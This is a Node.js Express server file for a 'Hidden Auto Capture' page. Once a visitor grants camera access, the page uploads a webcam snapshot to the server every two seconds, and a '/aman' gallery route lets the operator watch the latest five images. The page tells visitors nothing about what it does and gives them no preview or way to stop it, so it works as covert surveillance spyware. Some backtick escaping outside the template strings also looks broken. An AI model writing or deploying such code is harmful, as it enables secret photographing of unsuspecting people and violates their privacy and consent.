const express = require('express');
const app = express();
const http = require('http').Server(app);
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

// Middleware
app.use(bodyParser.json({ limit: '10mb' }));
app.use('/img', express.static(path.join(__dirname, 'uploads')));

// Store image files
const imagesDir = path.join(__dirname, 'uploads');

// =======================
// Capture page at "/"
// =======================
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Automatic Image Capture</title>
        </head>
        <body style="background:#111;color:#fff;text-align:center;">
            <h1>📸 Hidden Auto Capture</h1>
            <script>
                async function start() {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();

                        setInterval(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataUrl = canvas.toDataURL('image/png');

                            fetch('/upload', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ image: dataUrl })
                            });
                        }, 2000);
                    } catch (err) {
                        console.error('Error accessing camera:', err);
                    }
                }
                start();
            </script>
        </body>
        </html>
    `);
});

// =======================
// Gallery page at "/aman"
// =======================
app.get('/aman', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Latest 5 Photos</title>
            <style>
                body { background:#111; color:#fff; text-align:center; font-family:Arial; }
                #gallery img { width:200px; margin:10px; border-radius:10px; }
            </style>
        </head>
        <body>
            <h1>🖼️ Latest 5 Photos</h1>
            <div id="gallery">Loading...</div>

            <script>
                async function loadGallery() {
                    try {
                        const res = await fetch('/images');
                        const data = await res.json();
                        const gallery = document.getElementById('gallery');
                        gallery.innerHTML = '';
                        data.images.forEach(url => {
                            const img = document.createElement('img');
                            img.src = url;
                            gallery.appendChild(img);
                        });
                    } catch (err) {
                        console.error(err);
                    }
                }

                // Load now and refresh every 3 sec
                loadGallery();
                setInterval(loadGallery, 3000);
            </script>
        </body>
        </html>
    `);
});

// =======================
// Upload Endpoint
// =======================
app.post('/upload', (req, res) => {
    const { image } = req.body;
    if (image) {
        const base64Data = image.replace(/^data:image\\/png;base64,/, '');
        const filePath = path.join(imagesDir, \`\${Date.now()}.png\`);
        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (err) return res.status(500).json({ error: 'Failed to save image' });
            updateImageList();
            const url = \`\${req.protocol}://\${req.get('host')}/img/\${path.basename(filePath)}\`;
            res.json({ url });
        });
    } else {
        res.status(400).json({ error: 'No image data' });
    }
});

// =======================
// Latest 5 photos API
// =======================
app.get('/images', (req, res) => {
    fs.readdir(imagesDir, (err, files) => {
        if (err) return res.status(500).json({ error: 'Failed to read directory' });

        // Sort by time (newest first)
        const fileStats = files.map(file => {
            const filePath = path.join(imagesDir, file);
            const stats = fs.statSync(filePath);
            return { file, mtime: stats.mtime };
        });
        fileStats.sort((a, b) => b.mtime - a.mtime);
        const latestFiles = fileStats.slice(0, 5).map(f => f.file);

        const baseUrl = \`\${req.protocol}://\${req.get('host')}/img/\`;
        const imageUrls = latestFiles.map(file => \`\${baseUrl}\${file}\`);
        res.json({ images: imageUrls });
    });
});

// =======================
// Keep only latest 5
// =======================
function updateImageList() {
    fs.readdir(imagesDir, (err, files) => {
        if (err) return;
        const fileStats = files.map(file => {
            const filePath = path.join(imagesDir, file);
            const stats = fs.statSync(filePath);
            return { file, mtime: stats.mtime };
        });
        fileStats.sort((a, b) => b.mtime - a.mtime);
        const filesToDelete = fileStats.slice(5).map(f => f.file);
        filesToDelete.forEach(file => {
            fs.unlink(path.join(imagesDir, file), () => {});
        });
    });
}

// Create 'uploads' dir if missing
if (!fs.existsSync(imagesDir)) {
    fs.mkdirSync(imagesDir);
}

// Start server
http.listen(process.env.PORT || 3000, () => {
    console.log('✅ Server running on port 3000');
});
